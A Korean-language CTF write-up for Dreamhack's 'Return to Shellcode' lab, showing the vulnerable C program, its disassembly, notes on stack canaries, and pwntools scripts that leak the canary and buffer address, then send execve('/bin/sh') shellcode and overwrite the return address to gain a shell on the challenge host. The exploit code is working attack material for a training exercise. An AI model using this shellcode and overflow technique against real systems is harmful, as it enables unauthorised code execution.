---
layout: posts
title: "return_to_sellcode"
categories: ["CTF"]
---

## 문제

**문제 설명**

**Description
Exploit Tech: Return to Shellcode에서 실습하는 문제입니다.**

```python
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
└─$ cat r2s.c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  *printf*("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

## 해결

```python
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000000008cd <+0>:     push   rbp
   0x00000000000008ce <+1>:     mov    rbp,rsp
   0x00000000000008d1 <+4>:     sub    rsp,0x60
   0x00000000000008d5 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000000008de <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008e2 <+21>:    xor    eax,eax
   0x00000000000008e4 <+23>:    mov    eax,0x0
   0x00000000000008e9 <+28>:    call   0x88a <init>
   0x00000000000008ee <+33>:    lea    rax,[rbp-0x60]
   0x00000000000008f2 <+37>:    mov    rsi,rax
   0x00000000000008f5 <+40>:    lea    rdi,[rip+0x16c]        # 0xa68
   0x00000000000008fc <+47>:    mov    eax,0x0
   0x0000000000000901 <+52>:    call   0x720 <printf@plt>
   0x0000000000000906 <+57>:    mov    rax,rbp
   0x0000000000000909 <+60>:    mov    rdx,rax
   0x000000000000090c <+63>:    lea    rax,[rbp-0x60]
   0x0000000000000910 <+67>:    sub    rdx,rax
   0x0000000000000913 <+70>:    mov    rax,rdx
   0x0000000000000916 <+73>:    mov    rsi,rax
   0x0000000000000919 <+76>:    lea    rdi,[rip+0x160]        # 0xa80
   0x0000000000000920 <+83>:    mov    eax,0x0
   0x0000000000000925 <+88>:    call   0x720 <printf@plt>
   0x000000000000092a <+93>:    lea    rdi,[rip+0x173]        # 0xaa4
   0x0000000000000931 <+100>:   call   0x700 <puts@plt>
   0x0000000000000936 <+105>:   lea    rdi,[rip+0x17b]        # 0xab8
   0x000000000000093d <+112>:   mov    eax,0x0
   0x0000000000000942 <+117>:   call   0x720 <printf@plt>
   0x0000000000000947 <+122>:   mov    rax,QWORD PTR [rip+0x2006c2]        # 0x201010 <stdout@@GLIBC_2.2.5>
   0x000000000000094e <+129>:   mov    rdi,rax
   0x0000000000000951 <+132>:   call   0x750 <fflush@plt>
   0x0000000000000956 <+137>:   lea    rax,[rbp-0x60]
   0x000000000000095a <+141>:   mov    edx,0x100
   0x000000000000095f <+146>:   mov    rsi,rax
   0x0000000000000962 <+149>:   mov    edi,0x0
   0x0000000000000967 <+154>:   call   0x730 <read@plt>
   0x000000000000096c <+159>:   lea    rax,[rbp-0x60]
   0x0000000000000970 <+163>:   mov    rsi,rax
   0x0000000000000973 <+166>:   lea    rdi,[rip+0x146]        # 0xac0
   0x000000000000097a <+173>:   mov    eax,0x0
   0x000000000000097f <+178>:   call   0x720 <printf@plt>
   0x0000000000000984 <+183>:   lea    rdi,[rip+0x14d]        # 0xad8
   0x000000000000098b <+190>:   call   0x700 <puts@plt>
   0x0000000000000990 <+195>:   lea    rdi,[rip+0x121]        # 0xab8
   0x0000000000000997 <+202>:   mov    eax,0x0
   0x000000000000099c <+207>:   call   0x720 <printf@plt>
   0x00000000000009a1 <+212>:   mov    rax,QWORD PTR [rip+0x200668]        # 0x201010 <stdout@@GLIBC_2.2.5>
   0x00000000000009a8 <+219>:   mov    rdi,rax
   0x00000000000009ab <+222>:   call   0x750 <fflush@plt>
   0x00000000000009b0 <+227>:   lea    rax,[rbp-0x60]
   0x00000000000009b4 <+231>:   mov    rdi,rax
   0x00000000000009b7 <+234>:   mov    eax,0x0
   0x00000000000009bc <+239>:   call   0x740 <gets@plt>
   0x00000000000009c1 <+244>:   mov    eax,0x0
   0x00000000000009c6 <+249>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000000009ca <+253>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000000009d3 <+262>:   je     0x9da <main+269>
   0x00000000000009d5 <+264>:   call   0x710 <__stack_chk_fail@plt>
   0x00000000000009da <+269>:   leave
   0x00000000000009db <+270>:   ret
```

python3 -c "print('A' * 88)" > input.txt

### Stack Canary

<img width="1042" height="444" alt="image" src="https://github.com/user-attachments/assets/1fa5627f-96c0-4c23-859f-3b0464b00505" />


A stack canary is a security value placed in memory to detect buffer overflow attacks.

### Typical Canary Structure

A common canary looks like:

```
0x00????????
```

Notice:

- It often **starts with a NULL byte (`0x00`)**

### Why?

Because many overflow functions (like `strcpy`) stop at `\0`

---

형준님이 알려준 플로우

```python
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n",
       (char*)__builtin_frame_address(0) - buf);
```

→ buf 의 주소를 알려줌

→ buf 와 rbp 사이의 주소 거리를 알려줌 = 96

```python
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
└─$ ./r2s
Address of the buf: 0x7ffcbddc6940
Distance between buf and $rbp: 96
[1] Leak the canary
Input:
```

```python
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
└─$ ./r2s < input.txt
Address of the buf: 0x7ffcc2095220
Distance between buf and $rbp: 96
[1] Leak the canary
Input: Your input is 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Q�nK�
     ��S        ��'
[2] Overwrite the return address
Input: *** stack smashing detected ***: terminated
Aborted                    ./r2s < input.txt
```

→ input.txt 에 88 개의 A 를 적은 뒤 보낸 것.

```python
cat exploit.py
from pwn import *

 #p = remote("host3.dreamhack.games", 20179)

# payload = p32(0x0804a0b0) + b"/bin/sh\x00"
p = process("./r2s")

payload = b"A" * 88

p.sendafter(b"Input: ", payload)
p.recvuntil(b"ut is '")
p.recv(88)

buf_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Leaked buf_addr: {hex(buf_addr)}")

p.interactive()
```

```python
Leaked buf_addr: 0x205d325b0a27
```

```python
from pwn import *

context.arch = 'amd64'
p = remote("host8.dreamhack.games", 17371)

p.recvuntil(b"Address of the buf: ")
buf_addr = int(p.recvline(), 16)

p.recvuntil(b"Distance between buf and $rbp: ")
dist_rbp = int(p.recvline()) 
p.sendafter(b"Input: ", b"A" * (dist_rbp - 7))

p.recvuntil(b"A" * (dist_rbp - 7))
canary = u64(b"\x00" + p.recv(7)) 
log.info(f"Canary: {hex(canary)}")

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = shellcode 
payload += b"A" * (dist_rbp - 8 - len(shellcode)) 
payload += p64(canary)                            
payload += b"B" * 8                               
payload += p64(buf_addr)                          

p.sendlineafter(b"Input: ", payload)

p.interactive()
```
